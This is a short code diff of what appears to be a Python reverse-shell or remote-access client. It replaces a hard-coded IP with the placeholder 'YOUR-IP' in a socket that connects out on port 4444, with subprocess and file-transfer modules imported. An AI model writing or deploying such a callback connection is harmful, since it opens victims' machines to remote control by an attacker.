@@ -4,7 +4,7 @@ import subprocess
 import os
 from modules import comms, file_transfer
 
-HOST, PORT = '10.0.0.124', 4444
+HOST, PORT = 'YOUR-IP', 4444
 s = socket.socket()
 s.connect((HOST, PORT))
 
